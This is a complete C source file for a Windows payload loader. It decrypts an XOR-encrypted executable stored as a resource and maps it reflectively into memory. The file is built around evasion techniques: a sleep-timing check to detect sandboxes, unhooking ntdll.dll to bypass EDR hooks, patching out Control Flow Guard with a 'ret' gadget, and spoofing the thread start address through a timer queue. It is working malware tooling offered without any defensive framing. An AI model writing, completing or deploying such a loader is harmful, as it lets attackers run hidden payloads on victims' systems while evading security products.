#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include "resource.h"    
#include "crypto.h"      

// [IMPORTANT] Define the function pointer type globally at the top
typedef void (WINAPI* _PayloadEntry)();

// --- 1. Evasion Helpers ---

// NEW: Anti-Emulation Check
// Returns 1 if safe (real human), 0 if sandbox (emulator detected)
int IsRealEnvironment() {
    printf("[*] Checking for Emulation...\n");

    ULONGLONG t1 = GetTickCount64();

    // Sleep for 3 seconds. 
    // Emulators usually "fast forward" this to save time.
    Sleep(3000);

    ULONGLONG t2 = GetTickCount64();

    // If less than 2.8 seconds actually passed, we are being fast-forwarded.
    if ((t2 - t1) < 2800) {
        printf("[-] Emulator Detected! (Sleep Skipped)\n");
        return 0;
    }

    printf("[+] Environment seems real.\n");
    return 1;
}

// Helper: Unhook ntdll.dll to bypass EDR hooks
void UnhookNtdll() {
    printf("[*] Unhooking ntdll.dll...\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    LPVOID lpNtdllBase = (LPVOID)hNtdll;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return; }

    LPVOID lpFileBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpFileBase) { CloseHandle(hMapping); CloseHandle(hFile); return; }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpFileBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpFileBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if ((strcmp((char*)pSection[i].Name, ".text") == 0) || (pSection[i].Characteristics & IMAGE_SCN_CNT_CODE)) {
            LPVOID lpCleanText = (LPVOID)((DWORD_PTR)lpFileBase + pSection[i].VirtualAddress);
            LPVOID lpDirtyText = (LPVOID)((DWORD_PTR)lpNtdllBase + pSection[i].VirtualAddress);
            SIZE_T size = pSection[i].Misc.VirtualSize;

            DWORD oldProtect;
            if (VirtualProtect(lpDirtyText, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(lpDirtyText, lpCleanText, size);
                VirtualProtect(lpDirtyText, size, oldProtect, &oldProtect);
                printf("[+] ntdll.dll unhooked successfully!\n");
            }
            break;
        }
        pSection++;
    }
    UnmapViewOfFile(lpFileBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

// Proxy function for Thread Start Spoofing
void CALLBACK ProxyPayload(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
    _PayloadEntry entryPoint = (_PayloadEntry)lpParameter;
    printf("[!] Executing Payload via clean System Thread (RtlpTpWorkerThread)...\n");
    entryPoint();
}

// RunPayloadSafe using TimerQueue for Spoofing
void RunPayloadSafe(_PayloadEntry entryPoint) {
    printf("[*] Spoofing Thread Start Address via TimerQueue...\n");

    HANDLE hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        printf("[-] Failed to create timer queue.\n");
        return;
    }

    HANDLE hTimer = NULL;
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)ProxyPayload, (PVOID)entryPoint, 0, 0, WT_EXECUTEINTIMERTHREAD)) {
        printf("[-] Failed to create timer.\n");
        return;
    }

    printf("[*] Payload scheduled. Main thread sleeping...\n");
    Sleep(INFINITE);
}

// --- 2. ExitProcess Hook ---
void WINAPI FakeExitProcess(UINT uExitCode) {
    // printf statements removed here to reduce strings in binary
    ExitThread(uExitCode);
}

// --- 3. Security & CFG Helpers ---
void InitSecurityCookie(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    __try {
        PIMAGE_DATA_DIRECTORY loadConfigDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
        if (loadConfigDir->Size == 0) return;

        PIMAGE_LOAD_CONFIG_DIRECTORY64 loadConfig = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PUINT8)targetBase + loadConfigDir->VirtualAddress);
        ULONG_PTR cookieVA = loadConfig->SecurityCookie;
        if (cookieVA == 0) return;

        ULONG_PTR oldBase = ntHeaders->OptionalHeader.ImageBase;
        if (cookieVA >= oldBase && cookieVA < oldBase + ntHeaders->OptionalHeader.SizeOfImage) {
            cookieVA = (ULONG_PTR)targetBase + (cookieVA - oldBase);
        }

        ULONG_PTR newCookie = 0x2B992DDFA232 ^ GetTickCount64();
        if (cookieVA >= (ULONG_PTR)targetBase && cookieVA < (ULONG_PTR)targetBase + ntHeaders->OptionalHeader.SizeOfImage) {
            *(ULONG_PTR*)cookieVA = newCookie;
            // printf("[+] Security Cookie Initialized.\n");
        }
    }
    __except (1) {}
}

// Returns 1 if CFG is disabled (or not present), 0 if patching failed
int DisableCFG(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    // printf("[*] Attempting to Disable CFG...\n");
    __try {
        PIMAGE_DATA_DIRECTORY loadConfigDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
        if (loadConfigDir->Size == 0) return 1; // No CFG, safe to proceed

        PIMAGE_LOAD_CONFIG_DIRECTORY64 loadConfig = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PUINT8)targetBase + loadConfigDir->VirtualAddress);
        ULONG_PTR guardCheckVA = loadConfig->GuardCFCheckFunctionPointer;
        if (guardCheckVA == 0) return 1; // CFG not enabled, safe

        ULONG_PTR oldBase = ntHeaders->OptionalHeader.ImageBase;

        // Relocate the VA to the new base
        if (guardCheckVA >= oldBase && guardCheckVA < oldBase + ntHeaders->OptionalHeader.SizeOfImage) {
            guardCheckVA = (ULONG_PTR)targetBase + (guardCheckVA - oldBase);
        }
        else {
            return 0; // Address out of bounds
        }

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        PBYTE pRetGadget = NULL;
        // Find a 'ret' (0xC3) instruction in ntdll to overwrite the check
        for (int i = 0; i < 0x1000; i++) {
            if (((PBYTE)hNtdll)[i] == 0xC3) {
                pRetGadget = (PBYTE)hNtdll + i;
                break;
            }
        }

        if (pRetGadget && guardCheckVA >= (ULONG_PTR)targetBase && guardCheckVA < (ULONG_PTR)targetBase + ntHeaders->OptionalHeader.SizeOfImage) {
            ULONG_PTR* pSlot = (ULONG_PTR*)guardCheckVA;
            DWORD oldProtect;
            VirtualProtect(pSlot, sizeof(ULONG_PTR), PAGE_READWRITE, &oldProtect);
            *pSlot = (ULONG_PTR)pRetGadget;
            VirtualProtect(pSlot, sizeof(ULONG_PTR), oldProtect, &oldProtect);
            // printf("[+] CFG Disabled Successfully.\n");
            return 1;
        }
    }
    __except (1) {}

    return 0; // Failed
}

// --- 4. Import Resolvers ---
void ResolveImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    // printf("[*] Resolving Standard Imports...\n");
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size == 0) return;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PUINT8)targetBase + importDir->VirtualAddress);

    while (importDesc->Name != 0) {
        char* dllName = (char*)((PUINT8)targetBase + importDesc->Name);
        HMODULE hDll = LoadLibraryA(dllName);
        if (hDll) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->OriginalFirstThunk);

            while (originalThunk->u1.AddressOfData != 0) {
                FARPROC funcAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
                    funcAddr = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(originalThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((PUINT8)targetBase + originalThunk->u1.AddressOfData);
                    if (_stricmp(importByName->Name, "ExitProcess") == 0) funcAddr = (FARPROC)FakeExitProcess;
                    else funcAddr = GetProcAddress(hDll, importByName->Name);
                }
                if (funcAddr) thunk->u1.Function = (ULONG_PTR)funcAddr;
                thunk++;
                originalThunk++;
            }
        }
        importDesc++;
    }
}

void ResolveDelayImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    // printf("[*] Resolving Delay Imports...\n");
    PIMAGE_DATA_DIRECTORY delayDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
    if (delayDir->Size == 0) return;

    PIMAGE_DELAYLOAD_DESCRIPTOR delayDesc = (PIMAGE_DELAYLOAD_DESCRIPTOR)((PUINT8)targetBase + delayDir->VirtualAddress);

    while (delayDesc->DllNameRVA != 0) {
        char* dllName = (char*)((PUINT8)targetBase + delayDesc->DllNameRVA);
        HMODULE hDll = LoadLibraryA(dllName);
        if (hDll) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + delayDesc->ImportAddressTableRVA);
            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + delayDesc->ImportNameTableRVA);

            while (originalThunk->u1.AddressOfData != 0) {
                FARPROC funcAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
                    funcAddr = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(originalThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((PUINT8)targetBase + originalThunk->u1.AddressOfData);
                    if (_stricmp(importByName->Name, "ExitProcess") == 0) funcAddr = (FARPROC)FakeExitProcess;
                    else funcAddr = GetProcAddress(hDll, importByName->Name);
                }
                if (funcAddr) thunk->u1.Function = (ULONG_PTR)funcAddr;
                thunk++;
                originalThunk++;
            }
        }
        delayDesc++;
    }
}

void ProtectSections(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        DWORD oldProtect;
        DWORD protection = PAGE_READONLY;
        if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protection = PAGE_EXECUTE_READ;
        if ((section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)) protection = PAGE_EXECUTE_READWRITE;
        VirtualProtect((LPVOID)((PUINT8)targetBase + section[i].VirtualAddress), section[i].SizeOfRawData, protection, &oldProtect);
    }
}

// --- 5. Main Map Function ---
void MapPEToMemory(unsigned char* payload) {
    printf("[*] Parsing Headers...\n");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { printf("[-] Invalid DOS Signature\n"); return; }
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    LPVOID targetBase = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!targetBase) return;

    memcpy(targetBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            memcpy((PUINT8)targetBase + section[i].VirtualAddress, (PUINT8)payload + section[i].PointerToRawData, section[i].SizeOfRawData);
        }
    }

    // Relocations
    ULONG_PTR delta = (ULONG_PTR)targetBase - ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)targetBase + relocDir->VirtualAddress);
            while (reloc->VirtualAddress != 0) {
                DWORD entriesCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entry = (PWORD)(reloc + 1);
                for (DWORD i = 0; i < entriesCount; i++) {
                    WORD type = entry[i] >> 12;
                    WORD offset = entry[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) *(PULONG_PTR)((PUINT8)targetBase + reloc->VirtualAddress + offset) += delta;
                    else if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)((PUINT8)targetBase + reloc->VirtualAddress + offset) += (DWORD)delta;
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)reloc + reloc->SizeOfBlock);
            }
        }
    }

    ResolveImports(targetBase, ntHeaders);
    ResolveDelayImports(targetBase, ntHeaders);

    InitSecurityCookie(targetBase, ntHeaders);

    // CAPTURE THE RESULT
    int cfgStatus = DisableCFG(targetBase, ntHeaders);
    if (cfgStatus == 0) {
        printf("[-] CFG Patch Failed! Falling back to direct execution.\n");
    }

    ProtectSections(targetBase, ntHeaders);
    FlushInstructionCache(GetCurrentProcess(), targetBase, ntHeaders->OptionalHeader.SizeOfImage);

    // ... Console Handles Fix block ...

    _PayloadEntry pEntry = (_PayloadEntry)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    // LOGIC: Only use the stealthy TimerQueue if CFG is disabled
    if (cfgStatus == 1) {
        RunPayloadSafe(pEntry);
    }
    else {
        printf("[!] Skipping TimerQueue due to CFG failure. Jumping directly...\n");
        pEntry(); // Direct jump (Riskier but works if CFG is broken)
    }
}

// --- 6. Main ---
int main() {
    // 0. Anti-Emulation Check
    if (!IsRealEnvironment()) {
        return 0; // Exit silently if we are in a sandbox
    }

    // 1. Unhook EDR Hooks
    UnhookNtdll();

    char* key = "mysecretkey";
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (!hRes) return 1;

    HGLOBAL hResData = LoadResource(NULL, hRes);
    unsigned char* pResData = (unsigned char*)LockResource(hResData);
    size_t resSize = SizeofResource(NULL, hRes);

    unsigned char* payload = (unsigned char*)malloc(resSize);
    memcpy(payload, pResData, resSize);

    printf("[*] Decrypting...\n");
    XorCipher(payload, resSize, key, strlen(key));

    if (payload[0] == 'M' && payload[1] == 'Z') {
        printf("[+] MZ found.\n");
        MapPEToMemory(payload);
    }
    else {
        XorCipher(payload, resSize, key, strlen(key));
        size_t keyLen = strlen(key);
        for (size_t i = 0; i < resSize - 1; i++) payload[i + 1] ^= key[i % keyLen];
        if (payload[1] == 'M' && payload[2] == 'Z') {
            printf("[+] MZ found (Offset 1).\n");
            MapPEToMemory(payload + 1);
        }
        else {
            printf("[-] Critical: MZ not found.\n"); getchar();
        }
    }
    free(payload);
    return 0;
}